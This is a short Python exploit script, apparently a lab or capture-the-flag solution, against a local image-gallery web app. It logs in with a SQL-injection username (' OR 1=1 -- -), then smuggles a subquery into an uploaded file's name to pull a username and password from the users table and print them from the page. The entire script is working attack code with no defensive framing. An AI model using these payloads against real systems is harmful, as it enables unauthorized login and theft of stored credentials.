from requests import session
from bs4 import BeautifulSoup

print()
s = session()

# Login to the galery
url = "http://localhost:5000/login"
data = {
    "username": "' OR 1=1 -- -",
    "password": "x"
}
s.post(url, data=data)
print("\033[32;1m[+] Login successfully\033[0m")

# SQLi on file upload
payload = "'||(SELECT username||'~'||password FROM users LIMIT 1)||'"
url = "http://localhost:5000/galery"
file = {
    "image": (payload, b"random", "image/png")
}
r = s.post(url, files=file)
if r.status_code == 200:
    print("\033[32;1m[+] File upload successfully\033[0m")
else:
    print("\033[31;1m[-] SQLi return ERROR 500\033[0m")
    exit(0)

# Get SQLi output
r = s.get(url)
html = BeautifulSoup(r.text, "html.parser")
output = html.find_all(id="pic-name")[0].text
print("\033[32;1m[+] Output:\033[0m", output)
print()
